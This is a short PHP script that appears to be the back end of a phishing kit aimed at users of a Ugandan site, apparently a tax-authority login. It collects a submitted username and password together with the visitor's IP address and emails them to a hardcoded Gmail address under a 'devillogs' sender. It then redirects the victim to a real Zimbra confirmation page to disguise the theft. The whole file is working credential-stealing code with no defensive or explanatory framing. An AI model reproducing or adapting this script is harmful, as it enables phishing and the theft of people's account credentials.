<?
$ip = getenv("REMOTE_ADDR");
$message .= "Username: ".$_POST['username']."\n";
$message .= "Old Password: ".$_POST['password']."\n";
$message .= "New Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------+ Gh0St_kSa +-------------------\n";
$send = "charlesjacksonjrdonationjr@gmail.com";
$subject = "Ura.go.ug Pass $ip";
$headers = "From: devillogs<logs@yolo.co.uk>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://info.zimbra.com/thank-you-for-email-confirmation?utm_medium=email&_hsenc=p2ANqtz-8I09lDFy6L3xNA0uJnqpkIV2_aXfymqkuk50NcH6Nzz01Y4wiUa1Pb6XB38ll__wZDtfECcNQcrJWy3Exi8nrG9Menfw&_hsmi=29311710&utm_content=29311710&utm_source=hs_automation&hsCtaTracking=7caf23be-cc05-4889-a4a2-ff279913522c%7Ca1bdc729-a148-4578-8059-23d48b6f026f");
?>


